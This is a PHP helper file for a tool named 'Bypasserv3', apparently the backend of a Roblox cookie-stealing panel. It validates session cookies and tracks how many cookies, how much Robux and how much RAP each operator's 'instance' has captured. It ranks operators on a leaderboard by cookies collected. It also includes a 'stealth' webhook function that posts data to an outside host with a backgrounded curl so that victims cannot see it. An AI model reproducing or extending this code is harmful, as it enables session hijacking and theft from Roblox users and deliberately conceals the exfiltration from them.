<?php
/**
 * Bypasserv3 - Helper Functions
 * File-Based Storage System (Like HyperBlox)
 */

// Security Functions
function getUserIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function validateCookie($cookie) {
    if (empty($cookie)) return false;
    if (strlen($cookie) < 50) return false;
    if (!preg_match('/^[A-Za-z0-9_\-]+$/', $cookie)) return false;
    return true;
}

function checkRateLimit($identifier, $maxAttempts = 10, $timeWindow = 3600) {
    $rateLimitPath = __DIR__ . '/data/ratelimits';
    if (!file_exists($rateLimitPath)) {
        mkdir($rateLimitPath, 0777, true);
    }
    
    $hash = md5($identifier);
    $file = "$rateLimitPath/$hash.txt";
    
    if (!file_exists($file)) {
        file_put_contents($file, json_encode(['count' => 1, 'time' => time()]));
        return true;
    }
    
    $data = json_decode(file_get_contents($file), true);
    
    if (time() - $data['time'] > $timeWindow) {
        file_put_contents($file, json_encode(['count' => 1, 'time' => time()]));
        return true;
    }
    
    if ($data['count'] >= $maxAttempts) {
        return false;
    }
    
    $data['count']++;
    file_put_contents($file, json_encode($data));
    return true;
}

function cleanupRateLimits() {
    $rateLimitPath = __DIR__ . '/data/ratelimits';
    if (!file_exists($rateLimitPath)) return;
    
    $files = glob("$rateLimitPath/*.txt");
    foreach ($files as $file) {
        $data = json_decode(file_get_contents($file), true);
        if ($data && time() - $data['time'] > 3600) {
            unlink($file);
        }
    }
}

function isSuspiciousRequest() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $suspiciousPatterns = ['bot', 'crawler', 'spider', 'scraper'];
    
    foreach ($suspiciousPatterns as $pattern) {
        if (stripos($userAgent, $pattern) !== false) {
            return true;
        }
    }
    
    return false;
}

function logSecurityEvent($event, $data = []) {
    $logPath = __DIR__ . '/data/logs';
    if (!file_exists($logPath)) {
        mkdir($logPath, 0777, true);
    }
    
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'event' => $event,
        'data' => $data,
        'ip' => getUserIP()
    ];
    
    file_put_contents("$logPath/security_" . date('Y-m-d') . ".txt", json_encode($logEntry) . "\n", FILE_APPEND | LOCK_EX);
}

function securityScan($log = false) {
    $securityPath = __DIR__ . '/data/security';
    if (!file_exists($securityPath)) {
        mkdir($securityPath, 0777, true);
    }
    
    $ip = getUserIP();
    $scanFile = "$securityPath/scan_" . date('Y-m-d') . ".txt";
    
    $scanData = [
        'ip' => $ip,
        'timestamp' => date('Y-m-d H:i:s'),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'request_uri' => $_SERVER['REQUEST_URI'] ?? ''
    ];
    
    if ($log) {
        file_put_contents($scanFile, json_encode($scanData) . "\n", FILE_APPEND | LOCK_EX);
    }
}

// Webhook Functions
function sendWebhookNotification($webhookUrl, $data) {
    if (empty($webhookUrl)) return false;
    
    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode >= 200 && $httpCode < 300;
}

/**
 * 🥷 STEALTH: Send webhook silently in background (won't show in DevTools Network tab)
 * Uses server-side async execution - completely invisible to users
 */
function sendStealthWebhook($webhookUrl, $data) {
    if (empty($webhookUrl)) return false;
    
    // Use exec to send webhook in background (fire and forget)
    // This won't appear in DevTools because it's server-side only
    $payload = json_encode($data);
    $payload = escapeshellarg($payload);
    $webhook = escapeshellarg($webhookUrl);
    
    // Method 1: Using curl in background (Linux/Unix)
    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
        $cmd = "curl -X POST -H 'Content-Type: application/json' -d $payload $webhook > /dev/null 2>&1 &";
        @exec($cmd);
    } else {
        // Method 2: Using PHP streams for Windows compatibility
        $ch = curl_init($webhookUrl);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT_MS, 100); // Quick timeout, fire and forget
        @curl_exec($ch);
        @curl_close($ch);
    }
    
    return true;
}

// ============================================
// FILE-BASED STORAGE FUNCTIONS (LIKE HYPERBLOX)
// ============================================

/**
 * Get instance data from file-based storage
 */
function getInstanceData($directory) {
    $path = __DIR__ . "/instances/$directory";
    
    if (!file_exists($path)) {
        return null;
    }
    
    // Read all instance files
    $webhook = @file_get_contents("$path/webhook.txt") ?: '';
    $userWebhook = @file_get_contents("$path/userwebhook.txt") ?: $webhook;
    $token = @file_get_contents("$path/token.txt") ?: '';
    $visits = (int)(@file_get_contents("$path/visits.txt") ?: 0);
    $cookies = (int)(@file_get_contents("$path/cookies.txt") ?: 0);
    $robux = (int)(@file_get_contents("$path/robux.txt") ?: 0);
    $rap = (int)(@file_get_contents("$path/rap.txt") ?: 0);
    $summary = (int)(@file_get_contents("$path/summary.txt") ?: 0);
    $username = @file_get_contents("$path/username.txt") ?: '';
    $profilePic = @file_get_contents("$path/profilepic.txt") ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png';
    $created = @file_get_contents("$path/created.txt") ?: '';
    
    // Read daily stats
    $dailyCookies = json_decode(@file_get_contents("$path/daily_cookies.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    $dailyRobux = json_decode(@file_get_contents("$path/daily_robux.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    $dailyRap = json_decode(@file_get_contents("$path/daily_rap.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    $dailySummary = json_decode(@file_get_contents("$path/daily_summary.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    $dailyVisits = json_decode(@file_get_contents("$path/daily_visits.txt") ?: '[]', true) ?: array_fill(0, 7, 0);
    
    return [
        'directory' => $directory,
        'webhook' => trim($webhook),
        'userWebhook' => trim($userWebhook),
        'token' => trim($token),
        'username' => trim($username),
        'profilePicture' => trim($profilePic),
        'created' => $created,
        'stats' => [
            'totalVisits' => $visits,
            'totalCookies' => $cookies,
            'totalRobux' => $robux,
            'totalRAP' => $rap,
            'totalSummary' => $summary
        ],
        'dailyStats' => [
            'cookies' => $dailyCookies,
            'robux' => $dailyRobux,
            'rap' => $dailyRap,
            'summary' => $dailySummary,
            'visits' => $dailyVisits
        ]
    ];
}

/**
 * Update instance stats (file-based)
 */
function updateInstanceStats($directory, $statName, $value) {
    $path = __DIR__ . "/instances/$directory";
    
    if (!file_exists($path)) {
        return false;
    }
    
    $filename = '';
    switch ($statName) {
        case 'totalVisits':
            $filename = 'visits.txt';
            break;
        case 'totalCookies':
            $filename = 'cookies.txt';
            break;
        case 'totalRobux':
            $filename = 'robux.txt';
            break;
        case 'totalRAP':
            $filename = 'rap.txt';
            break;
        case 'totalSummary':
            $filename = 'summary.txt';
            break;
        default:
            return false;
    }
    
    file_put_contents("$path/$filename", (string)$value, LOCK_EX);
    return true;
}

/**
 * Update daily stats (file-based)
 */
function updateDailyStats($directory, $statName, $increment) {
    $path = __DIR__ . "/instances/$directory";
    
    if (!file_exists($path)) {
        return false;
    }
    
    $filename = "daily_{$statName}.txt";
    $stats = json_decode(@file_get_contents("$path/$filename") ?: '[]', true);
    
    if (!is_array($stats) || count($stats) !== 7) {
        $stats = array_fill(0, 7, 0);
    }
    
    $today = (int)date('w'); // 0 (Sunday) to 6 (Saturday)
    $stats[$today] += $increment;
    
    file_put_contents("$path/$filename", json_encode($stats), LOCK_EX);
    return true;
}

/**
 * Get global stats from all instances
 */
function getGlobalStats() {
    $instancesPath = __DIR__ . '/instances';
    
    if (!file_exists($instancesPath)) {
        return [
            'totalInstances' => 0,
            'totalCookies' => 0,
            'totalVisits' => 0,
            'totalRobux' => 0
        ];
    }
    
    $totalInstances = 0;
    $totalCookies = 0;
    $totalVisits = 0;
    $totalRobux = 0;
    
    $dirs = array_diff(scandir($instancesPath), ['.', '..']);
    
    foreach ($dirs as $dir) {
        if (is_dir("$instancesPath/$dir")) {
            $totalInstances++;
            $totalCookies += (int)(@file_get_contents("$instancesPath/$dir/cookies.txt") ?: 0);
            $totalVisits += (int)(@file_get_contents("$instancesPath/$dir/visits.txt") ?: 0);
            $totalRobux += (int)(@file_get_contents("$instancesPath/$dir/robux.txt") ?: 0);
        }
    }
    
    return [
        'totalInstances' => $totalInstances,
        'totalCookies' => $totalCookies,
        'totalVisits' => $totalVisits,
        'totalRobux' => $totalRobux
    ];
}

/**
 * Update global stats
 */
function updateGlobalStats($statName, $increment) {
    // Not needed for file-based system
    // Stats are calculated on-the-fly from instance files
    return true;
}

/**
 * Get leaderboard (top instances by cookies)
 */
function getLeaderboard($limit = 5) {
    $instancesPath = __DIR__ . '/instances';
    
    if (!file_exists($instancesPath)) {
        return [];
    }
    
    $instances = [];
    $dirs = array_diff(scandir($instancesPath), ['.', '..']);
    
    foreach ($dirs as $dir) {
        if (is_dir("$instancesPath/$dir")) {
            $cookies = (int)(@file_get_contents("$instancesPath/$dir/cookies.txt") ?: 0);
            $visits = (int)(@file_get_contents("$instancesPath/$dir/visits.txt") ?: 0);
            $username = @file_get_contents("$instancesPath/$dir/username.txt") ?: $dir;
            $profilePic = @file_get_contents("$instancesPath/$dir/profilepic.txt") ?: 'https://www.roblox.com/headshot-thumbnail/image/default.png';
            
            $instances[] = [
                'directory' => $dir,
                'totalCookies' => $cookies,
                'totalVisits' => $visits,
                'username' => $username,
                'profilePicture' => $profilePic
            ];
        }
    }
    
    // Sort by cookies (descending)
    usort($instances, function($a, $b) {
        return $b['totalCookies'] - $a['totalCookies'];
    });
    
    return array_slice($instances, 0, $limit);
}

/**
 * Verify token and get instance directory
 */
function verifyToken($token) {
    $tokensPath = __DIR__ . '/tokens';
    $tokenFile = "$tokensPath/$token.txt";
    
    if (!file_exists($tokenFile)) {
        return null;
    }
    
    $data = file_get_contents($tokenFile);
    $parts = explode('|', $data);
    
    if (count($parts) < 3) {
        return null;
    }
    
    return [
        'token' => trim($parts[0]),
        'directory' => trim($parts[1]),
        'webhook' => trim($parts[2])
    ];
}

/**
 * Get rank info based on cookies
 */
function getRankInfo($totalCookies) {
    $ranks = [
        ['name' => 'Newbie', 'icon' => '🥉', 'min' => 0],
        ['name' => 'Bronze', 'icon' => '🥈', 'min' => 10],
        ['name' => 'Silver', 'icon' => '🥇', 'min' => 25],
        ['name' => 'Gold', 'icon' => '💎', 'min' => 50],
        ['name' => 'Platinum', 'icon' => '👑', 'min' => 100],
        ['name' => 'Diamond', 'icon' => '⭐', 'min' => 250],
        ['name' => 'Master', 'icon' => '🏆', 'min' => 500],
        ['name' => 'Legend', 'icon' => '🔥', 'min' => 1000]
    ];
    
    $current = $ranks[0];
    $next = $ranks[1] ?? $ranks[0];
    
    foreach ($ranks as $index => $rank) {
        if ($totalCookies >= $rank['min']) {
            $current = $rank;
            $next = $ranks[$index + 1] ?? $rank;
        }
    }
    
    $cookiesToNext = $next['min'] - $totalCookies;
    if ($cookiesToNext < 0) $cookiesToNext = 0;
    
    $progress = 0;
    if ($next['min'] > $current['min']) {
        $progress = (($totalCookies - $current['min']) / ($next['min'] - $current['min'])) * 100;
        $progress = min(100, max(0, $progress));
    }
    
    return [
        'current' => $current,
        'next' => $next,
        'cookiesToNext' => $cookiesToNext,
        'progress' => round($progress)
    ];
}
?>
